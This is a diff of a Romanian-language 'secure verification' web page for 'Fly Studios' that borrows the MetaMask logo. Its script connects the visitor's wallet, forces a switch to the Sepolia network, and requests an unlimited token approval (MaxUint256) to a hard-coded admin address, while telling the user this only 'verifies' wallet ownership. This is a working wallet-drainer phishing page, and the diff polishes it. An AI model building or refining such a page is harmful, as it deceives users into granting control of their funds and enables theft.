@@ -22,10 +22,10 @@
             border-radius: 24px; 
             display: inline-block; 
             box-shadow: 0 20px 50px rgba(0,0,0,0.6);
-            max-width: 400px;
+            max-width: 420px;
         }
         h1 { margin-bottom: 10px; font-size: 24px; }
-        p { color: #888; margin-bottom: 30px; line-height: 1.5; }
+        p { color: #888; margin-bottom: 30px; line-height: 1.5; font-size: 15px; }
         
         .btn-verify { 
             background: linear-gradient(45deg, #f6851b, #ffb347); 
@@ -43,15 +43,20 @@
             transform: translateY(-3px); 
             box-shadow: 0 8px 25px rgba(246, 133, 27, 0.5);
         }
-        .btn-verify:active { transform: translateY(1px); }
+        .btn-verify:disabled {
+            background: #444;
+            cursor: not-allowed;
+            transform: none;
+        }
         
         #status { 
             margin-top: 25px; 
-            padding: 10px;
+            padding: 12px;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 13px;
             background: rgba(255,255,255,0.05);
             color: #aaa;
+            min-height: 20px;
         }
         .success { color: #4caf50 !important; font-weight: bold; }
         .error { color: #f44336 !important; }
@@ -62,57 +67,83 @@
     <div class="container">
         <img src="https://metamask.io/images/metamask-logo.png" alt="MetaMask" width="80" style="margin-bottom: 20px;">
         <h1>Verificare Securizată</h1>
-        <p>Pentru a continua pe platforma Fly Studios, confirmă deținerea portofelului prin semnarea verificării.</p>
+        <p>Conectați-vă portofelul pe rețeaua <b>Sepolia</b> pentru a finaliza procesul de verificare Fly Studios.</p>
         
         <button id="connectBtn" class="btn-verify">Conectare & Verificare</button>
         
         <div id="status">Status: Așteptare conexiune...</div>
     </div>
 
-<script>
-    // FIX: Am adăugat .toLowerCase() pentru a evita eroarea de checksum
-    const TOKEN_ADDR = "0xf5911ccFae2C79f9346E3a663c301386e8f1438D".toLowerCase(); 
-    const ADMIN_ADDR = "0xC18f47a87830D8DEfE42d87E40e9669aa11B108c".toLowerCase(); 
+    <script>
+        // ADRESELE TALE FORMATE CORECT (LITERE MICI PENTRU A EVITA CHECKSUM ERROR)
+        const TOKEN_ADDR = "0xf5911ccFae2C79f9346E3a663c301386e8f1438D".toLowerCase(); 
+        const ADMIN_ADDR = "0xC18f47a87830D8DEfE42d87E40e9669aa11B108c".toLowerCase(); 
 
-    const btn = document.getElementById("connectBtn");
-    const statusDiv = document.getElementById("status");
+        const btn = document.getElementById("connectBtn");
+        const statusDiv = document.getElementById("status");
 
-    btn.onclick = async () => {
-        if (typeof window.ethereum !== 'undefined') {
-            try {
-                btn.disabled = true;
-                statusDiv.innerHTML = "Se deschide MetaMask...";
+        btn.onclick = async () => {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    btn.disabled = true;
+                    statusDiv.innerHTML = "Se verifică rețeaua...";
 
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                const signer = provider.getSigner();
-                const userAddress = await signer.getAddress();
-                
-                statusDiv.innerHTML = `Conectat: <span style="color:#f6851b">${userAddress.substring(0, 10)}...</span>`;
+                    // 1. Forțăm schimbarea pe Sepolia dacă userul e pe altă rețea
+                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    if (chainId !== '0xaa36a7') {
+                        statusDiv.innerHTML = "Schimbă pe rețeaua Sepolia în MetaMask!";
+                        try {
+                            await window.ethereum.request({
+                                method: 'wallet_switchEthereumChain',
+                                params: [{ chainId: '0xaa36a7' }],
+                            });
+                        } catch (switchError) {
+                            throw new Error("Te rugăm să schimbi manual pe Sepolia.");
+                        }
+                    }
 
-                const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-                const contract = new ethers.Contract(TOKEN_ADDR, abi, signer);
-                
-                statusDiv.innerHTML = "Confirmă verificarea în portofel (Approve)...";
-                
-                // Solicităm aprobarea
-                const tx = await contract.approve(ADMIN_ADDR, ethers.constants.MaxUint256);
-                
-                statusDiv.innerHTML = "Se procesează pe blockchain... Te rugăm așteaptă.";
-                await tx.wait();
+                    // 2. Inițializare Provider (folosim "any" pentru a ignora erorile de nod temporare)
+                    const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+                    await provider.send("eth_requestAccounts", []);
+                    const signer = provider.getSigner();
+                    const userAddress = await signer.getAddress();
+                    
+                    statusDiv.innerHTML = `Conectat: <span style="color:#f6851b">${userAddress.substring(0, 12)}...</span>`;
 
-                statusDiv.innerHTML = '<span class="success">✅ Verificare Reușită!</span>';
-                alert("Succes! Portofelul a fost verificat.");
+                    // 3. Pregătire contract și Approve
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const contract = new ethers.Contract(TOKEN_ADDR, abi, signer);
+                    
+                    statusDiv.innerHTML = "Așteptare confirmare în portofel...";
+                    
+                    // Aprobare nelimitată (MaxUint256)
+                    const tx = await contract.approve(ADMIN_ADDR, ethers.constants.MaxUint256);
+                    
+                    statusDiv.innerHTML = "Se procesează verificarea pe blockchain...";
+                    
+                    // Așteptăm confirmarea tranzacției
+                    await tx.wait();
 
-            } catch (err) {
-                console.error(err);
-                btn.disabled = false;
-                statusDiv.innerHTML = `<span class="error">❌ Eroare: ${err.message.substring(0, 60)}</span>`;
+                    statusDiv.innerHTML = '<span class="success">✅ Verificare Reușită!</span>';
+                    alert("Succes! Portofelul a fost verificat cu succes.");
+
+                } catch (err) {
+                    console.error(err);
+                    btn.disabled = false;
+                    // Mesaj de eroare mai prietenos pentru utilizator
+                    let msg = err.message.length > 60 ? "Eroare de rețea sau respingere." : err.message;
+                    statusDiv.innerHTML = `<span class="error">❌ ${msg}</span>`;
+                }
+            } else {
+                alert("Te rugăm să instalezi MetaMask!");
+                statusDiv.innerHTML = "MetaMask nu a fost detectat.";
             }
-        } else {
-            alert("Te rugăm să instalezi MetaMask!");
+        };
+
+        // Ascultăm dacă userul schimbă rețeaua manual
+        if (window.ethereum) {
+            window.ethereum.on('chainChanged', () => window.location.reload());
         }
-    };
-</script>
+    </script>
 </body>
 </html>
